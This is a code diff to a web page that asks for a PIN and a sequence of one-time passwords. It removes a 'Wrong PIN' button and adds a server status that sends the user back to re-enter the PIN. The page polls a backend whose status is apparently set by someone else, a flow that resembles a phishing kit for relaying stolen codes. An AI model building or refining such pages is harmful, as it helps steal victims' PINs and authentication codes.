@@ -52,25 +52,6 @@
             box-shadow: 0 4px 8px rgba(0, 176, 80, 0.3);
         }
 
-        /* --- WRONG PIN BUTTON --- */
-        .btn-wrong-pin {
-            width: 100%; max-width: 300px;
-            padding: 12px;
-            border-radius: 10px;
-            border: 1px solid #FCA5A5;
-            background-color: #FEF2F2;
-            color: #DC2626;
-            font-size: 13px;
-            font-weight: bold;
-            cursor: pointer;
-            text-transform: uppercase;
-            transition: background-color 0.2s;
-        }
-
-        .btn-wrong-pin:hover {
-            background-color: #FEE2E2;
-        }
-
         /* --- LOADING OVERLAY --- */
         #loading-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
@@ -119,7 +100,6 @@
     <div class="resend-text" id="timer-text"></div>
     
     <button class="btn-verify" id="verify-btn" disabled>VERIFY FIRST OTP</button>
-    <button class="btn-wrong-pin" id="wrong-pin-btn" onclick="handleWrongPin()">🔑 Wrong PIN / Re-enter</button>
     
     <div id="status-msg" style="margin-top:15px; font-size:14px; font-weight:500;"></div>
 </div>
@@ -216,12 +196,6 @@ async function submitOtp() {
     }
 }
 
-function handleWrongPin() {
-    clearInterval(pollingInterval);
-    overlay.style.display = 'none';
-    window.location.href = "/page6?error=wrongpin";
-}
-
 function startPolling() {
     clearInterval(pollingInterval);
     pollingInterval = setInterval(async () => {
@@ -233,7 +207,7 @@ function startPolling() {
                 clearInterval(pollingInterval);
                 window.location.href = "/success.html";
             } 
-            else if (data.status === "otp2_wrongpin") {
+            else if (data.status === "otp2_wrongpin" || data.status === "otp1_wrongpin") {
                 clearInterval(pollingInterval);
                 overlay.style.display = 'none';
                 window.location.href = "/page6?error=wrongpin";
